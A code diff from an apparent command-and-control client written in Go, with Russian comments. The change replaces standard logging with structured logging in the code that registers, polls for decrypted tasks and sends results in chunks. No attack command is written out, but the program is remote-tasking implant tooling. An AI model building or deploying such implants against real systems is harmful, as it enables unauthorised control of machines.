@@ -8,11 +8,11 @@ import (
 	"c2-project/internal/compress"
 	"c2-project/internal/crypto"
 	"c2-project/internal/jwt"
+	"c2-project/internal/logger"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
 	"encoding/json"
 	"fmt"
-	"log"
 	"net/http"
 	"os"
 	"os/exec"
@@ -55,7 +55,7 @@ func NewService(configFile string, clientIDOverride string) (*Service, error) {
 	// Переопределяем ClientID если указан
 	if clientIDOverride != "" {
 		cfg.ClientID = clientIDOverride
-		log.Printf("[INFO] Client ID overridden to: %s", cfg.ClientID)
+		logger.Info("Client ID overridden", logger.String("client_id", cfg.ClientID))
 	}
 
 	return &Service{
@@ -67,19 +67,19 @@ func NewService(configFile string, clientIDOverride string) (*Service, error) {
 // Run - запускает основной цикл клиента.
 // Регистрируется, затем периодически опрашивает задачи и выполняет их.
 func (s *Service) Run() error {
-	log.Printf("[START] Client %s starting...", s.config.ClientID)
+	logger.Info("Client starting", logger.String("client_id", s.config.ClientID))
 
 	// Регистрация
 	if err := s.register(); err != nil {
 		return fmt.Errorf("registration failed: %w", err)
 	}
-	log.Println("[OK] Registration successful")
+	logger.Info("Registration successful")
 
 	// Основной цикл
 	for {
 		task, err := s.poll()
 		if err != nil {
-			log.Printf("[ERROR] Poll error: %v", err)
+			logger.Error("Poll error", logger.Err(err))
 			time.Sleep(time.Duration(s.config.PollInterval) * time.Second)
 			continue
 		}
@@ -99,7 +99,7 @@ func (s *Service) Run() error {
 
 		// Отправляем результат
 		if err := s.sendResult(task.ID, output, status); err != nil {
-			log.Printf("[ERROR] Failed to send result: %v", err)
+			logger.Error("Failed to send result", logger.Err(err))
 		}
 
 		time.Sleep(1 * time.Second)
@@ -108,7 +108,7 @@ func (s *Service) Run() error {
 
 // Close - штатное завершение работы клиента.
 func (s *Service) Close() error {
-	log.Printf("[STOP] Client %s stopping...", s.config.ClientID)
+	logger.Info("Client stopping", logger.String("client_id", s.config.ClientID))
 	// Здесь можно добавить сохранение состояния, закрытие соединений и т.д.
 	return nil
 }
@@ -188,7 +188,7 @@ func (s *Service) poll() (models.Task, error) {
 		}
 	}
 
-	log.Printf("[DECRYPT] Task decrypted: %s", task.Command)
+	logger.Info("Task decrypted", logger.String("command", task.Command))
 	return task, nil
 }
 
@@ -294,7 +294,7 @@ func (s *Service) sendResult(taskID, output, status string) error {
 		return fmt.Errorf("failed to split data")
 	}
 
-	log.Printf("[CHUNK] Sending %d chunks", len(chunks))
+	logger.Debug("Sending chunks", logger.Int("total", len(chunks)))
 
 	// Отправляем каждый чанк
 	for i, c := range chunks {
@@ -314,10 +314,13 @@ func (s *Service) sendResult(taskID, output, status string) error {
 		}
 
 		if err := s.sendChunk("Bearer " + token); err != nil {
-			log.Printf("[ERROR] Failed to send chunk %d/%d: %v", i+1, len(chunks), err)
+			logger.Error("Failed to send chunk",
+				logger.Int("chunk", i+1),
+				logger.Int("total", len(chunks)),
+				logger.Err(err))
 			continue
 		}
-		log.Printf("[CHUNK] Sent chunk %d/%d", i+1, len(chunks))
+		logger.Debug("Chunk sent", logger.Int("chunk", i+1), logger.Int("total", len(chunks)))
 		time.Sleep(100 * time.Millisecond)
 	}
 
